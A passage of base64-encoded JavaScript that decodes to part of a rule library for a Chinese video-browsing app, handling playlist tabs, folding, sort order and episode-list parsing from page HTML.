CAgICBwdXRNeVZhcihmb2xkbmFtZSwgICcxJyk7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGNzID0gc3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0ICsgJ19jbHMnKTtcXFxcbiAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIob2JqLmV4dHJhLmlkLCBjcyk7XFxcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbShidG4uZXh0cmEuaWQsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGJ0bi50aXRsZS5yZXBsYWNlKGZvbGRzWzBdLCBmb2xkc1sxXSksXFxcXG4gICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpZihmb2xkPT0nMScpe1xcXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoZm9sZG5hbWUsICAnMCcpO1xcXFxuICAgICAgICAgICAgICAgIHZhciBwY2xzID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0KTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgY3ggPSAkLmRhdGFDb252ZXJ0KHBjbHMpO1xcXFxuICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKHNoc29ydCArICdfY2xzJywgY3gpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhzaHNvcnQpO1xcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oYnRuLmV4dHJhLmlkLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBidG4udGl0bGUucmVwbGFjZShmb2xkc1sxXSwgZm9sZHNbMF0pLFxcXFxuICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly8nICsgKGZvbGQgPT09ICcxJyA/ICfmlLbotbcnIDogJ+WxleW8gCcpO1xcXFxuICAgICAgICAgICAgfSwgZm9sZG5hbWUsc2hzb3J0KSxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfYnV0dG9uJyxcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgdGhpcy5jcmVhdGVQTGlzdCh0YWJzLHZhcmksc2hzb3J0LGN1c3RvbSk7XFxcXG4gICAgfSxcXFxcbiAgICBzZXRUYWJzMjogZnVuY3Rpb24odGFicywgdmFyaSwgc2hzb3J0LHBhcnNlLGV4cCkge1xcXFxuICAgICAgICBsZXQgY3VzdG9tPXBhcnNlLuiHquWumuS5iTtcXFxcbiAgICAgICAgY3VzdG9tID10aGlzLmdldFByZXNldChjdXN0b20pO1xcXFxuICAgICAgICBcXFxcbiAgICAgICAgc2hzb3J0ID0gc2hzb3J0ID8gc2hzb3J0IDogJ3Noc29ydCc7XFxcXG4gICAgICAgIHZhciB0aXRsZSA9IChnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpID09ICcxJykgPyAnPGI+PHNwYW4gc3R5bGU9XFxcXFxcXCJjb2xvcjonK2N1c3RvbS7pgIbluo/popzoibIrJ1xcXFxcXFwiPumAhuW6jzwvc3Bhbj48L2I+JyA6ICc8Yj48c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOicrY3VzdG9tLuato+W6j+minOiJsisnXFxcXFxcXCI+5q2j5bqPPC9zcGFuPjwvYj4nXFxcXG4gICAgICBcXFxcbiAgICAgICAgdmFyIOaKmOWPoCA9ICc8Yj7mipjlj6AnICsgJ+KYtycuZm9udGNvbG9yKFxcXFxcXFwiI0QzRDNEM1xcXFxcXFwiKTtcXFxcbiAgICAgICAgdmFyIOWxleW8gCA9ICc8Yj7lsZXlvIAnICsgJ+KYsCcuZm9udGNvbG9yKFxcXFxcXFwiI0ZGQTUwMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgdmFyIGZvbGRuYW1lID0gJ2VyXycgKyB2YXJpICsgJ2ZvbGQnO1xcXFxuICAgICAgICB2YXIgZm9sZCA9IGdldE15VmFyKGZvbGRuYW1lLCAnMScpO1xcXFxuXFxcXG4gICAgICAgIHZhciB1cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChmb2xkbmFtZSwgc2hzb3J0LHB1c2gpID0+IHtcXFxcbiAgICAgICAgICAgIHZhciBwbCA9IHN0b3JhZ2UwLmdldE15VmFyKCdlcl9wbGF5bGlzdHMnLCAne30nKTtcXFxcbiAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhwbCkubGVuZ3RoID09IDEpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgIHZhciBmb2xkID0gZ2V0TXlWYXIoZm9sZG5hbWUsICcxJyk7XFxcXG4gICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInKVxcXFxuICAgICAgICAgICAgaWYgKGZvbGQgPT0gJzEnKSB7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGJjbHMgPSBmaW5kSXRlbShzaHNvcnQgKyAnX2J1dHRvbicpO1xcXFxuICAgICAgICAgICAgICAgIHZhciB0Y2xzID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0ICsgJ190YWInKTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgbGNscyA9IGZpbmRJdGVtKHNoc29ydCArICdfbGluZScpO1xcXFxuICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIHZhciBwY2xzID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0KTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgY3MgPSBbYmNsc10uY29uY2F0KHRjbHMsIFtsY2xzXSwgcGNscyk7XFxcXG4gICAgICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICAgICAgaWYocHVzaCl7XFxcXG4gICAgICAgICAgICAgICAgICB2YXIgcGNscz1maW5kSXRlbXNCeUNscyhzaHNvcnQrJ19wdXNodGFiJyk7XFxcXG4gICAgICAgICAgICAgICAgICBjcz1wY2xzLmNvbmNhdChjcyk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgdmFyIGN4ID0gJC5kYXRhQ29udmVydChjcyk7XFxcXG4gICAgICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoc2hzb3J0ICsgJ19jbHMnLCBjeCk7XFxcXG4gICAgICAgICAgICAgICAgaWYocHVzaCl7XFxcXG4gICAgICAgICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoc2hzb3J0KydfcHVzaHRhYicpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtKGJjbHMuZXh0cmEuaWQpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhzaHNvcnQgKyAnX3RhYicpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW0oc2hzb3J0ICsgJ19saW5lJyk7XFxcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKHNoc29ydCk7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKG9iai5leHRyYS5pZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBvYmouZGVzYy5yZXBsYWNlKCflsZXlvIA8Zm9udCBjb2xvcj1cXFxcXFxcIiNGRkE1MDBcXFxcXFxcIj7imLAnLCAn5oqY5Y+gPGZvbnQgY29sb3I9XFxcXFxcXCIjRDNEM0QzXFxcXFxcXCI+4pi3JyksXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGlmIChmb2xkID09ICcwJykge1xcXFxuICAgICAgICAgICAgICAgIHZhciBjcyA9IHN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCArICdfY2xzJyk7XFxcXG4gICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKHNoc29ydCArICdfYXZhdGFyJywgY3MpO1xcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0ob2JqLmV4dHJhLmlkLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IG9iai5kZXNjLnJlcGxhY2UoJ+aKmOWPoDxmb250IGNvbG9yPVxcXFxcXFwiI0QzRDNEM1xcXFxcXFwiPuKYtycsICflsZXlvIA8Zm9udCBjb2xvcj1cXFxcXFxcIiNGRkE1MDBcXFxcXFxcIj7imLAnKSxcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcHV0TXlWYXIoZm9sZG5hbWUsIGZvbGQgPT09ICcxJyA/ICcwJyA6ICcxJyk7XFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8vJyArIChmb2xkID09PSAnMScgPyAn5pS26LW3JyA6ICflsZXlvIAnKTtcXFxcbiAgICAgICAgfSwgZm9sZG5hbWUsIHNoc29ydCwocGFyc2VbJ+aOqOmAgSddP3RydWU6ZmFsc2UpKTtcXFxcbiAgICAgICAgdmFyIGRlc2MgPSAoZm9sZCA9PT0gJzAnID8g5oqY5Y+gIDog5bGV5byAKSArICdcXFxcXFxcXHQnO1xcXFxuICAgICAgICBcXFxcbiAgICAgICAgaWYoZXhwLmxlbmd0aD09MSl7XFxcXG4gICAgICAgICAgICB1cmw9J2hpa2VyOi8vZW1wdHknO1xcXFxuICAgICAgICAgICAgZGVzYz0nJztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IHZhcmkgKyAnOlxcXFxcXFxcdFxcXFxcXFxcdCcgKyAn5YWxJyArIFN0cmluZyh0YWJzLmxlbmd0aCkuZm9udGNvbG9yKCcjNDY4MkI0JykgKyAn5p2h57q/6LevJyxcXFxcbiAgICAgICAgICAgIGRlc2M6IGRlc2MsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcicsXFxcXG4gICAgICAgICAgICBpbWc6IGN1c3RvbS7lm77moIcsXFxcXG4gICAgICAgICAgICB1cmw6IHVybCxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfYXZhdGFyJyxcXFxcbiAgICAgICAgICAgICAgICBsb25nQ2xpY2s6dGhpcy5zZXRMb25nY2xpY2soc2hzb3J0KSxcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgaWYodHlwZW9mKHBhcnNlWyfmjqjpgIEnXSkhPSd1bmRlZmluZWQnJiZwYXJzZVsn5o6o6YCBJ10pXFxcXG4gICAgICAgIHRoaXMucHVzaFRhYignZXJfJyt2YXJpLHNoc29ydCk7XFxcXG4gICAgICAgIFxcXFxuICAgICAgICBpZiAoZm9sZCA9PSAnMCcpIHtcXFxcbiAgICAgICAgICAgIHJldHVyblxcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIHRpdGxlLFxcXFxuICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh2YXJpLCBzaHNvcnQsY3VzdG9tKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGNvbmYgPSBnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpO1xcXFxuICAgICAgICAgICAgICAgIHZhciBjbHNsaXN0cyA9IGZpbmRJdGVtc0J5Q2xzKHNoc29ydCk7XFxcXG4gICAgICAgICAgICAgICAgdmFyIG5ld2Nsc2xpc3QgPSAkLmRhdGFDb252ZXJ0KGNsc2xpc3RzKTtcXFxcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoc2hzb3J0KTtcXFxcbiAgICAgICAgICAgICAgICBuZXdjbHNsaXN0LnJldmVyc2UoKTtcXFxcbiAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoc2hzb3J0ICsgJ19saW5lJywgbmV3Y2xzbGlzdCk7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19idXR0b24nKVxcXFxuICAgICAgICAgICAgICAgIHZhciB0aXRsZXM9W2Ake2N1c3RvbS7mraPluo/popzoibJ9XFxcXFxcXCI+5q2j5bqPYCxgJHtjdXN0b20u6YCG5bqP6aKc6ImyfVxcXFxcXFwiPumAhuW6j2BdO1xcXFxuICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIGlmIChjb25mID09ICcxJykge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCArICdfYnV0dG9uJywge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IG9iai50aXRsZS5yZXBsYWNlKHRpdGxlc1sxXSwgdGl0bGVzWzBdKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoc2hzb3J0ICsgJ19zb3J0JywgJzAnKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCArICdfYnV0dG9uJywge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IG9iai50aXRsZS5yZXBsYWNlKHRpdGxlc1swXSwgdGl0bGVzWzFdKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoc2hzb3J0ICsgJ19zb3J0JywgJzEnKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgLy9yZWZyZXNoUGFnZSgpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIh+aNouaOkuW6j+aIkOWKnydcXFxcbiAgICAgICAgICAgIH0sIHZhcmksIHNoc29ydCxjdXN0b20pLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfYnV0dG9uJyxcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgdGhpcy5jcmVhdGVQTGlzdCh0YWJzLHZhcmksc2hzb3J0LGN1c3RvbSk7XFxcXG4gICAgfSxcXFxcbiAgICBzZXRMaXN0czogZnVuY3Rpb24obGlzdHMsIGluZGV4LCBzaHNvcnQscGFyc2UpIHtcXFxcblxcXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQgKyAnX2xpc3QnLCBsaXN0cyk7XFxcXG4gICAgICAgIFxcXFxuICAgICAgICBwYXJzZT1wYXJzZT9wYXJzZTp7fTtcXFxcbiAgICAgICAgdmFyIOagt+W8jz1wYXJzZS7moLflvI8/cGFyc2Uu5qC35byPOicnO1xcXFxuICAgICAgICB2YXIg5Zu+5qCHPXBhcnNlLuWbvuaghz9wYXJzZS7lm77moIc6J2h0dHBzOi8vaGlrZXJmYW5zLmNvbS90dWJpYW8vbW92aWUvMTMuc3ZnJztcXFxcbiAgICAgICAgdmFyIGFqYXg9cGFyc2UuQWpheD9wYXJzZS5BamF4OmZhbHNlO1xcXFxuXFxcXG4gICAgICAgIHNoc29ydCA9IHNoc29ydCA/IHNoc29ydCA6ICdzaHNvcnQnO1xcXFxuXFxcXG4gICAgICAgIGlmKGFqYXgpe1xcXFxuICAgICAgICAgICAgdmFyIGxpc3QgPSBsaXN0cztcXFxcbiAgICAgICAgICAgIGlmIChnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnKSA9PSAnMScgJiYgbGlzdHMubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgIGxpc3QgPSBsaXN0cy5yZXZlcnNlKCk7XFxcXG4gICAgICAgICAgIH1cXFxcbiAgICAgICAgfWVsc2V7XFxcXG4gICAgICAgICAgICB2YXIgbGlzdCA9IGxpc3RzW2luZGV4XTtcXFxcbiAgICAgICAgICAgIGlmIChnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnKSA9PSAnMScgJiYgbGlzdHMubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgIGxpc3QgPSBsaXN0c1tpbmRleF0ucmV2ZXJzZSgpO1xcXFxuICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgXFxcXG4gICAgICAgIGlmKOagt+W8jz09Jycpe1xcXFxuICAgICAgICAgIOagt+W8jz1saXN0Lmxlbmd0aCA+IDMgPyAndGV4dF80JyA6ICd0ZXh0XzInXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgXFxcXG4gICAgICAgIGlmKGxpc3QubGVuZ3RoID4gMCl7XFxcXG4gICAgICAgIHZhciBwbGlzdCA9IHN0b3JhZ2UwLmdldE15VmFyKCdlcl9wbGF5bGlzdHMnLCAne30nKTtcXFxcbiAgICAgICAgaWYoIXBsaXN0Lmhhc093blByb3BlcnR5KHNoc29ydCkpe1xcXFxuICAgICAgICAgICAgIHBsaXN0W3Noc29ydF09e307XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcGxpc3Rbc2hzb3J0XVsnY2xzJ109c2hzb3J0O1xcXFxuICAgICAgICBwbGlzdFtzaHNvcnRdWydjb2xfdHlwZSddPeagt+W8jztcXFxcbiAgICAgICAgcGxpc3Rbc2hzb3J0XVsncGljJ1095Zu+5qCHO1xcXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcignZXJfcGxheWxpc3RzJywgcGxpc3QpO1xcXFxuICAgICAgICB9ICAgXFxcXG4gICAgICAgIFxcXFxuICAgICAgICBcXFxcbiAgICAgICAgZm9yICh2YXIgaiBpbiBsaXN0KSB7XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBsaXN0W2pdLnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogbGlzdFtqXS51cmwsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IOagt+W8jyxcXFxcbiAgICAgICAgICAgICAgICBwaWM65Zu+5qCHLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBsaXN0W2pdLnVybC5yZXBsYWNlKC9AbGF6eVJ1bGVbXFxcXFxcXFxzXFxcXFxcXFxTXSsvZywgJycpLFxcXFxuICAgICAgICAgICAgICAgICAgICBjbHM6IHNoc29ydCxcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAgZ2V0VGFiczogZnVuY3Rpb24ocGFyc2UpIHtcXFxcbiAgICAgICAgdmFyIHRhYnMgPSBbXTtcXFxcbiAgICAgICAgdmFyIGFydHMgPSBwZGZhKGh0bWwsIHBhcnNlLue6v+i3ryk7XFxcXG4gICAgICAgIHZhciDnur/ot6/lkI0gPSBwYXJzZS7nur/ot6/lkI3np7A7XFxcXG4gICAgICAgIHZhciDmm7/mjaLlh73mlbAgPSAnJztcXFxcbiAgICAgICAgaWYgKHBhcnNlLue6v+i3r+WQjeensC5pbmNsdWRlcygnQEAnKSkge1xcXFxuICAgICAgICAgICAg57q/6Lev5ZCNID0gcGFyc2Uu57q/6Lev5ZCN56ewLnNwbGl0KCdAQCcpWzBdO1xcXFxuICAgICAgICAgICAg5pu/5o2i5Ye95pWwID0gcGFyc2Uu57q/6Lev5ZCN56ewLnNwbGl0KCdAQCcpWzFdO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGZvciAodmFyIGkgaW4gYXJ0cykge1xcXFxuICAgICAgICAgICAgdmFyIGxpbmVuYW1lID0gcGRmaChhcnRzW2ldLCDnur/ot6/lkI0pO1xcXFxuICAgICAgICAgICAgaWYgKOabv+aNouWHveaVsCAhPSAnJykge1xcXFxuICAgICAgICAgICAgICAgIGxpbmVuYW1lID0gZXZhbCgnbGluZW5hbWUnICsg5pu/5o2i5Ye95pWwKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHRhYnMucHVzaChsaW5lbmFtZSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIHRhYnM7XFxcXG4gICAgfSxcXFxcbiAgICBnZXRMaXN0czogZnVuY3Rpb24ocGFyc2Usc2hzb3J0KSB7XFxcXG4gICAgICAgIHNoc29ydCA9IHNoc29ydCA/IHNoc29ydCA6ICdzaHNvcnQnO1xcXFxuICAgICAgICB2YXIgbGlzdHMgPSBbXTtcXFxcbiAgICAgICAgdmFyIGNvbnRzID0gcGRmYShodG1sLCBwYXJzZS7pgInpm4YpO1xcXFxuICAgICAgICB2YXIg6YCJ6ZuG5ZCN56ewID0gcGFyc2Uu6YCJ6ZuG5ZCN56ewID8gcGFyc2Uu6YCJ6ZuG5ZCN56ewIDogJ2EmJlRleHQnO1xcXFxuICAgICAgICB2YXIg6YCJ6ZuG6ZO+5o6lID0gcGFyc2Uu6YCJ6ZuG6ZO+5o6lID8gcGFyc2Uu6YCJ6ZuG6ZO+5o6lIDogJ2EmJmhyZWYnO1xcXFxuICAgICAgICB2YXIg6Kej5p6QID0gcGFyc2Uu6Kej5p6QID8gcGFyc2Uu6Kej5p6QIDogJyc7XFxcXG4gICAgICAgIHZhciB0ZW1wID0gW107XFxcXG4gICAgICAgIGZvciAodmFyIGkgaW4gY29udHMpIHtcXFxcbiAgICAgICAgICAgIGlmIChwYXJzZS7pgInpm4bliJfooaggIT0gdW5kZWZpbmVkKSB7XFxcXG4gICAgICAgICAgICAgICAgbGlzdHMucHVzaChwZGZhKGNvbnRzW2ldLCBwYXJzZS7pgInpm4bliJfooagpLm1hcCh4ID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBwZGZoKHgsIOmAiembhuWQjeensCksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHBkKHgsIOmAiembhumTvuaOpSkgKyDop6PmnpAsXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9KSlcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgdmFyIHVybCA9IHBkKGNvbnRzW2ldLCDpgInpm4bpk77mjqUpO1xcXFxuICAgICAgICAgICAgICAgIGlmICgh6YCJ6ZuG6ZO+5o6lLmluY2x1ZGVzKCdocmVmJykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsID0gcGRmaChjb250c1tpXSwg6YCJ6ZuG6ZO+5o6lKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgdGVtcC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHBkZmgoY29udHNbaV0sIOmAiembhuWQjeensCksXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdXJsICsg6Kej5p6QLFxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IOWAkuW6jyA9IHBhcnNlLuWAkuW6jyA/IHBhcnNlLuWAkuW6jyA6IGZhbHNlO1xcXFxuICAgICAgICB2YXIgcmVzdWx0cyA9IGxpc3RzLmxlbmd0aCA/IGxpc3RzIDogW3RlbXBdO1xcXFxuICAgICAgICBpZiAo5YCS5bqPKSB7XFxcXG4gICAgICAgICAgICByZXN1bHRzID0gcmVzdWx0cy5tYXAoeCA9PiB4LnJldmVyc2UoKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdmFyIHBsaXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ2VyX3BsYXlsaXN0cycsICd7fScpO1xcXFxuICAgICAgICBpZiAocmVzdWx0cy5zb21lKHggPT4geC5sZW5ndGggPiAwKSkge1xcXFxuICAgICAgICAgICBpZighcGxpc3QuaGFzT3duUHJvcGVydHkoc2hzb3J0KSl7XFxcXG4gICAgICAgICAgICAgcGxpc3Rbc2hzb3J0XT17fTtcXFxcbiAgICAgICAgICAgfVxcXFxuICAgICAgICAgICBwbGlzdFtzaHNvcnRdWydsZW5ndGgnXT1yZXN1bHRzLmxlbmd0aDtcXFxcbiAgICAgICAgfTtcXFxcbiAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ2VyX3BsYXlsaXN0cycsIHBsaXN0KTtcXFxcbiAgICAgICAgcmV0dXJuIHJlc3VsdHM7XFxcXG4gICAgfSxcXFxcbiAgICBnZXRQbGF5ZXJzOiBmdW5jdGlvbihwYXJzZSwgbW9kZSxmdW5jKSB7XFxcXG4gICAgICAgIC8vbG9nKG1vZGUpXFxcXG4gICAgICAgIHZhciBwbGF5ID0gJ2VyX3BsYXlsaXN0Xyc7XFxcXG4gICAgICAgIHRoaXMucHJlTG9hZChmdW5jKTtcXFxcbiAgICAgICAgdGhpcy5jbG9zZShwYXJzZS5tYXAoeCA9PiB4Luexu+WeiyksIHBhcnNlLmxlbmd0aCk7XFxcXG4gICAgICAgIG1vZGUgPSBtb2RlID8gbW9kZSA6IDE7XFxcXG4gICAgICAgIFxcXFxuICAgICAgICB2YXIgcGU9cGFyc2UubWFwKHg9PnBkZmEoaHRtbCx4Lue6v+i3rykubGVuZ3RoKS5maWx0ZXIoeT0+eT4wKTtcXFxcbiAgICAgICAgXFxcXG4gICAgICAgIFxcXFxuICAgICAgICBwYXJzZS5mb3JFYWNoKChpdGVtLCBpKSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgdGFicyA9IFsn5Li757q/J107XFxcXG4gICAgICAgICAgICBpZiAoaXRlbS7nur/ot68gIT0gdW5kZWZpbmVkKSB7XFxcXG4gICAgICAgICAgICAgICAgdGFicyA9IHRoaXMuZ2V0VGFicyhpdGVtKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHB1dE15VmFyKHBsYXkraSsnX3RhYnMnLHRhYnMpO1xcXFxuICAgICAgICAgICAgaWYoaXRlbS5BamF4KXtcXFxcbiAgICAgICAgICAgICAgICBpZiAobW9kZSA9PSAxKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc2V0VGFicyh0YWJzLCBpdGVtLuexu+WeiywgcGxheSArIGksaXRlbSk7XFxcXG4gICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc2V0VGFiczIodGFicywgaXRlbS7nsbvlnossIHBsYXkgKyBpLGl0ZW0scGUpO1xcXFxuICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgIHB1dE15VmFyKCdlcl9odG1sJyxodG1sKTtcXFxcbiAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2VyX3VybCcsTVlfVVJMKTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIHZhciBsaXN0cz1mdW5jKGdldE15VmFyKCdlcl8nK2l0ZW0u57G75Z6LLCcwJyksTVlfVVJMKTtcXFxcbiAgICAgICAgICAgIH1lbHNle1xcXFxuICAgICAgICAgICAgdmFyIGxpc3RzID0gdGhpcy5nZXRMaXN0cyhpdGVtLCBwbGF5K2kpO1xcXFxuICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICBcXFxcbiAgICAgICAgICAgIGlmIChsaXN0cy5zb21lKHggPT4geC5sZW5ndGggPiAwKSkge1xcXFxuICAgICAgICAgICAgICAgIGlmIChtb2RlID09IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZXRUYWJzKHRhYnMsIGl0ZW0u57G75Z6LLCBwbGF5ICsgaSxpdGVtKTtcXFxcbiAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZXRUYWJzMih0YWJzLCBpdGVtLuexu+WeiywgcGxheSArIGksaXRlbSxwZSk7XFxcXG4gICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoJ2VyXycgKyBpdGVtLuexu+WeiyArICdmb2xkJywgJzEnKSA9PSAnMScpIHtcXFxcbiAgICAgICAgICAgICAgICB0aGlzLnNldExpc3RzKGxpc3RzLCBnZXRNeVZhcignZXJfJytpdGVtLuexu+WeiywgJzAnKSwgcGxheSArIGksaXRlbSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcbn1cXFxcbl